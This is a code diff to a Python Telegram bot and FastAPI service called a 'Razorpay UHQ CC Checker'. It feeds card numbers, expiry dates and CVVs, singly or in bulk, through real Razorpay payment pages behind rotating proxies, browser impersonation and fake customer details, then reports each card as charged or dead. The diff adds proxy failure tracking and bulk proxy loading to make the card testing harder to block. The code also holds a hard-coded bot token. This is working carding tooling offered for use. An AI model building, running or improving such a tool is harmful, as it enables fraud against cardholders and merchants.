@@ -14,20 +14,21 @@ import uvicorn
 
 from curl_cffi.requests import AsyncSession
 
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram import Update
 from telegram.ext import (
     ApplicationBuilder,
     ContextTypes,
     MessageHandler,
     CommandHandler,
-    filters,
-    CallbackQueryHandler
+    filters
 )
 
 TELEGRAM_BOT_TOKEN = "8031306974:AAFUlWwpvWDSeFDM3pjvDDv0_vo2l95wk5U"
 
-# Dynamic Proxy Storage (Managed via Telegram Commands)
+# Dynamic Proxy Storage & Smart Failure Tracking
 RAW_PROXIES = []
+PROXY_FAIL_COUNTS = {}
+MAX_PROXY_FAILS = 3
 
 RAZORPAY_URLS = [
     "https://razorpay.me/@onsiteteams",
@@ -43,7 +44,7 @@ url_index = 0
 logging.basicConfig(format="%(asctime)s | %(levelname)s | %(message)s", level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-api_app = FastAPI(title="Razorpay Proxy Manager API", version="10.0")
+api_app = FastAPI(title="Razorpay CC Checker API", version="13.0")
 
 class CardRequest(BaseModel):
     cc: str
@@ -52,16 +53,30 @@ class CardRequest(BaseModel):
     cvv: str
     amount: int = 1
 
+@api_app.get("/")
+async def root():
+    return {"status": "Bot is active and running 24/7!", "active_proxies": len(RAW_PROXIES)}
+
 def format_proxy(raw):
-    raw = raw.strip()
-    if not raw: return None
+    if not raw: 
+        return None
+    
+    raw = raw.strip().replace('"', '').replace("'", "").replace("\r", "")
+    if not raw: 
+        return None
+
     if "://" not in raw:
         parts = raw.split(":")
-        if len(parts) == 4: 
-            # host:port:user:pass -> http://user:pass@host:port
-            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
-        elif len(parts) == 2: 
+        if len(parts) == 4:
+            if parts[1].isdigit() and int(parts[1]) < 65536:
+                return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
+            elif parts[3].isdigit() and int(parts[3]) < 65536:
+                return f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
+            else:
+                return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
+        elif len(parts) == 2:
             return f"http://{raw}"
+    
     return raw
 
 async def test_proxy(raw_proxy):
@@ -76,13 +91,6 @@ async def test_proxy(raw_proxy):
     except Exception as e:
         return False, str(e)[:45]
     return False, "Connection timeout or refused"
-
-def get_strict_proxy():
-    global proxy_index
-    if not RAW_PROXIES: return None
-    p = RAW_PROXIES[proxy_index % len(RAW_PROXIES)]
-    proxy_index += 1
-    return format_proxy(p)
 
 def get_rotating_url():
     global url_index
@@ -152,7 +160,11 @@ async def process_card_pipeline_with_logs(cc, mm, yy, cvv, amount=1, status_call
     email = f"user_{random.randint(1000,9999)}@gmail.com"
 
     yy_formatted = yy[2:] if len(yy) == 4 else yy
-    year = int("20" + yy_formatted)
+    try:
+        year = int("20" + yy_formatted)
+    except:
+        year = 2030
+        
     amount_paise = amount * 100
 
     device_id = f"1.{hashlib.sha1(uuid.uuid4().bytes).hexdigest()}.{int(time.time()*1000)}.{random.randint(0,99999999):08d}"
@@ -162,13 +174,21 @@ async def process_card_pipeline_with_logs(cc, mm, yy, cvv, amount=1, status_call
         if status_callback:
             await status_callback(proxy_st, api_st, gw_resp)
 
-    max_attempts = max(len(RAW_PROXIES), 1)
-    for _ in range(max_attempts):
-        current_proxy = get_strict_proxy()
-        if not current_proxy:
-            return {"status": "error", "response": "No active proxies available", "proxy": "NONE"}
+    active_pool = [p for p in RAW_PROXIES if PROXY_FAIL_COUNTS.get(p, 0) < MAX_PROXY_FAILS]
+    if not active_pool:
+        PROXY_FAIL_COUNTS.clear()
+        active_pool = RAW_PROXIES
 
-        proxy_short = current_proxy.split("@")[-1].split(":")[0] if current_proxy else "PROXY"
+    max_attempts = min(len(active_pool), 3)
+    
+    for _ in range(max_attempts):
+        current_raw_proxy = random.choice(active_pool)
+        current_proxy = format_proxy(current_raw_proxy)
+        
+        if not current_proxy:
+            continue
+
+        proxy_short = current_raw_proxy.split("@")[-1].split(":")[0] if current_raw_proxy else "PROXY"
         target_url = get_rotating_url()
         site_name = target_url.split("//")[-1].split("/")[0][:15]
 
@@ -178,23 +198,24 @@ async def process_card_pipeline_with_logs(cc, mm, yy, cvv, amount=1, status_call
             async with AsyncSession(impersonate="chrome120") as session:
                 
                 async def proxy_request(method, url, **kwargs):
-                    return await session.request(method, url, proxy=current_proxy, timeout=25, **kwargs)
+                    return await session.request(method, url, proxy=current_proxy, timeout=20, **kwargs)
 
                 await proxy_request("GET", target_url)
+                await asyncio.sleep(0.2)
 
                 resp = await proxy_request("GET", target_url)
                 if resp.status_code != 200:
-                    continue
+                    raise Exception(f"HTTP {resp.status_code}")
                 
                 html_body = resp.text
                 config_json = extract_embedded_json(html_body)
                 if not config_json:
-                    continue
+                    raise Exception("Config JSON not found")
 
                 parsed = json.loads(config_json)
                 key_id = parsed.get("key_id")
                 if not key_id:
-                    continue
+                    raise Exception("Key ID missing")
 
                 link_id, item_id = "", ""
                 for k in ["payment_link", "payment_page"]:
@@ -205,7 +226,7 @@ async def process_card_pipeline_with_logs(cc, mm, yy, cvv, amount=1, status_call
                         break
 
                 if not link_id:
-                    continue
+                    raise Exception("Link ID missing")
 
                 await notify(f"({proxy_short})", "Page Parsed!", "Creating Order...")
                 keyless_hdr = parsed.get("keyless_header", "")
@@ -226,7 +247,7 @@ async def process_card_pipeline_with_logs(cc, mm, yy, cvv, amount=1, status_call
                 order_obj = order_res.get("order", {})
                 order_id = order_obj.get("id")
                 if not order_id:
-                    continue
+                    raise Exception("Order creation failed")
 
                 checkout_ref = order_id.split("_")[1] if "_" in order_id else order_id
                 currency = order_obj.get("currency", "INR")
@@ -244,12 +265,12 @@ async def process_card_pipeline_with_logs(cc, mm, yy, cvv, amount=1, status_call
                 token_match = re.search(r'session_token[\'"]?\s*[:=]\s*[\'"]([A-F0-9]{40,})[\'"]', public_text, re.IGNORECASE)
                 if not token_match: token_match = re.search(r'window\.session_token="([^"]+)"', public_text)
                 if not token_match:
-                    continue
+                    raise Exception("Session token missing")
                 
                 session_token = token_match.group(1)
                 referer_url = f"https://api.razorpay.com/v1/checkout/public?traffic_env=production&build={BUILD}&build_v1={BUILD_V1}&checkout_v2=1&new_session=1&unified_session_id={session_id}&session_token={session_token}"
 
-                await notify(f"({proxy_short})", "Submitting Card (Ajax)...", "Checking CC...")
+                await notify(f"({proxy_short})", "Submitting Card (Ajax)", "Checking CC...")
 
                 form_data = {
                     "notes[comment]": "", "notes[email]": email, "notes[phone]": phone[3:], "notes[name]": "User",
@@ -272,6 +293,8 @@ async def process_card_pipeline_with_logs(cc, mm, yy, cvv, amount=1, status_call
                 )
                 payment_res = pay_resp.json()
 
+                PROXY_FAIL_COUNTS[current_raw_proxy] = 0
+
                 payment_id = payment_res.get("payment_id") or payment_res.get("id")
                 if not payment_id:
                     err_block = payment_res.get("error", {})
@@ -291,34 +314,35 @@ async def process_card_pipeline_with_logs(cc, mm, yy, cvv, amount=1, status_call
                 return {"status": "charged", "response": "Payment Successful", "proxy": proxy_short}
 
         except Exception as e:
-            logger.warning(f"⚠️ Attempt failed: {str(e)[:30]}. Retrying same card...")
+            PROXY_FAIL_COUNTS[current_raw_proxy] = PROXY_FAIL_COUNTS.get(current_raw_proxy, 0) + 1
+            logger.warning(f"⚠️ Proxy {proxy_short} failed: {str(e)[:35]}. Switching proxy...")
+            await asyncio.sleep(0.4)
             continue
 
-    return {"status": "error", "response": "Proxy connection or gateway timeout", "proxy": "PROXY"}
+    return {"status": "error", "response": "All proxy attempts timed out or failed", "proxy": "PROXY"}
 
 @api_app.post("/api/check")
 async def api_check(req: CardRequest):
     return await process_card_pipeline_with_logs(req.cc, req.mm, req.yy, req.cvv, req.amount)
 
-# --- TELEGRAM PROXY MANAGER COMMANDS ---
+# --- TELEGRAM COMMANDS ---
 
 async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
-        "⚡ **Razorpay Proxy Manager Bot Active**\n\n"
-        "⚡ **/proxy host:port:user:pass** (Add & Test Proxy)\n"
-        "⚡ **/myproxy** (View Active Proxies)\n"
-        "⚡ **/rmproxy <number>** (Remove Proxy)\n\n"
-        "• Send `.txt` file with `/msa` to check cards.",
+        "⚡ **Razorpay UHQ CC Checker Bot is Online!**\n\n"
+        "• Send a `.txt` file with `/msa` or drop a single card to start checking.\n"
+        "• Use `/proxy` to manage proxy settings or `/proxyadd` for bulk proxies.",
         parse_mode="Markdown"
     )
 
 async def proxy_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not context.args:
         await update.message.reply_text(
-            "⚠️ **Usage:**\n"
-            "`/proxy host:port:user:pass`\n"
-            "`/proxy http://user:pass@host:port`\n"
-            "`/proxy socks5://user:pass@host:port`",
+            "⚡ **Proxy Manager Menu**\n\n"
+            "⚡ `/proxy host:port:user:pass` (Add & Test Single Proxy)\n"
+            "⚡ `/proxyadd` (Bulk Add Proxies line-by-line)\n"
+            "⚡ `/myproxy` (View Active Proxies)\n"
+            "⚡ `/rmproxy <number>` (Remove Proxy)",
             parse_mode="Markdown"
         )
         return
@@ -345,9 +369,62 @@ async def proxy_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode="Markdown"
         )
 
+async def proxyadd_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    text = update.message.text
+    lines = text.splitlines()
+    
+    proxy_lines = [l.strip() for l in lines[1:] if l.strip()]
+    if not proxy_lines and context.args:
+        proxy_lines = [arg.strip() for arg in context.args if arg.strip()]
+
+    if not proxy_lines:
+        await update.message.reply_text(
+            "⚠️ **Bulk Proxy Add Usage:**\n\n"
+            "Type `/proxyadd` and paste your proxies line-by-line like this:\n\n"
+            "`/proxyadd`\n"
+            "`host1:port:user:pass`\n"
+            "`host2:port:user:pass`\n"
+            "`host3:port:user:pass`",
+            parse_mode="Markdown"
+        )
+        return
+
+    status_msg = await update.message.reply_text(f"🔍 Testing {len(proxy_lines)} proxies concurrently... Please wait.")
+    
+    added_count = 0
+    failed_count = 0
+    results_log = []
+
+    async def test_and_add(p):
+        nonlocal added_count, failed_count
+        success, info = await test_proxy(p)
+        if success:
+            if p not in RAW_PROXIES:
+                RAW_PROXIES.append(p)
+            added_count += 1
+            results_log.append(f"✅ `{p}`")
+        else:
+            failed_count += 1
+            results_log.append(f"❌ `{p}` (Dead)")
+
+    tasks = [test_and_add(p) for p in proxy_lines]
+    await asyncio.gather(*tasks)
+
+    summary = (
+        f"📊 **Bulk Proxy Add Report:**\n\n"
+        f"✅ Added Successfully: {added_count}\n"
+        f"❌ Dead / Failed: {failed_count}\n"
+        f"🛡️ Total Active Proxies: {len(RAW_PROXIES)}\n\n"
+        f"**Results Preview:**\n" + "\n".join(results_log[:15])
+    )
+    if len(results_log) > 15:
+        summary += f"\n*(and {len(results_log) - 15} more...)*"
+
+    await status_msg.edit_text(summary, parse_mode="Markdown")
+
 async def myproxy_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not RAW_PROXIES:
-        await update.message.reply_text("⚠️ No active proxies saved yet. Use `/proxy <proxy>` to add one.", parse_mode="Markdown")
+        await update.message.reply_text("⚠️ No active proxies saved yet. Use `/proxy` or `/proxyadd` to add them.", parse_mode="Markdown")
         return
     
     text = "🛡️ **Active Verified Proxies List:**\n\n"
@@ -384,7 +461,7 @@ def format_time(sec):
 
 async def msa_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not RAW_PROXIES:
-        await update.message.reply_text("⚠️ Please add at least one proxy first using `/proxy <proxy>`!", parse_mode="Markdown")
+        await update.message.reply_text("⚠️ Please add at least one proxy first using `/proxy` or `/proxyadd`!", parse_mode="Markdown")
         return
 
     doc = update.message.document or (update.message.reply_to_message and update.message.reply_to_message.document)
@@ -431,7 +508,7 @@ async def msa_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
             
             console_text = (
                 f"╔════════════════════════════════════╗\n"
-                f"║ 🟢 PROXY MANAGER CONSOLE           ║\n"
+                f"║ 🟢 RAZORPAY UHQ CC CHECKER         ║\n"
                 f"╠════════════════════════════════════╣\n"
                 f"║ 📊 Progress  : {idx}/{total:<19} ║\n"
                 f"║ 🛡️ Proxy IP  : {current_proxy_status:<19} ║\n"
@@ -457,7 +534,7 @@ async def msa_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if status == "error":
                 errors += 1
                 await update_screen(f"({proxy_used})", "Network Error - Retrying CC...", "Rechecking...")
-                await asyncio.sleep(1.5)
+                await asyncio.sleep(1.0)
                 continue
             
             if status == "charged":
@@ -483,7 +560,7 @@ async def msa_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 parse_mode="Markdown"
             )
 
-        await asyncio.sleep(0.5)
+        await asyncio.sleep(0.3)
 
     final_text = (
         f"╔════════════════════════════════════╗\n"
@@ -504,7 +581,7 @@ async def handle_single_card(update: Update, context: ContextTypes.DEFAULT_TYPE)
         return
 
     if not RAW_PROXIES:
-        await update.message.reply_text("⚠️ Please add a proxy first using `/proxy <proxy>` before checking cards!", parse_mode="Markdown")
+        await update.message.reply_text("⚠️ Please add a proxy first using `/proxy` or `/proxyadd` before checking cards!", parse_mode="Markdown")
         return
 
     raw = update.message.text.strip()
@@ -532,7 +609,7 @@ async def handle_single_card(update: Update, context: ContextTypes.DEFAULT_TYPE)
         status, resp_msg, proxy_used = res["status"], res["response"], res["proxy"]
         if status != "error":
             break
-        await asyncio.sleep(1.5)
+        await asyncio.sleep(1.0)
 
     if status in ["charged", "approved"]:
         reply = (
@@ -550,7 +627,8 @@ async def handle_single_card(update: Update, context: ContextTypes.DEFAULT_TYPE)
         await wait_msg.edit_text(f"ⓧ **Declined / Dead**\n▸ num: `{cc}|{mm}|{yy}|{cvv}`\n▸ resp: {resp_msg}", parse_mode="Markdown")
 
 def run_fastapi_server():
-    uvicorn.run(api_app, host="0.0.0.0", port=int(os.getenv("PORT", 7070)), log_level="warning")
+    port = int(os.getenv("PORT", 7070))
+    uvicorn.run(api_app, host="0.0.0.0", port=port, log_level="warning")
 
 def main():
     server_thread = Thread(target=run_fastapi_server, daemon=True)
@@ -559,12 +637,13 @@ def main():
     app = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", start_cmd))
     app.add_handler(CommandHandler("proxy", proxy_cmd))
+    app.add_handler(CommandHandler("proxyadd", proxyadd_cmd))
     app.add_handler(CommandHandler("myproxy", myproxy_cmd))
     app.add_handler(CommandHandler("rmproxy", rmproxy_cmd))
     app.add_handler(CommandHandler("msa", msa_cmd))
     app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_single_card))
     
-    logger.info("Starting Proxy Manager Bot + API Engine...")
+    logger.info("Starting Razorpay CC Checker Bot + API Engine...")
     app.run_polling()
 
 if __name__ == "__main__":
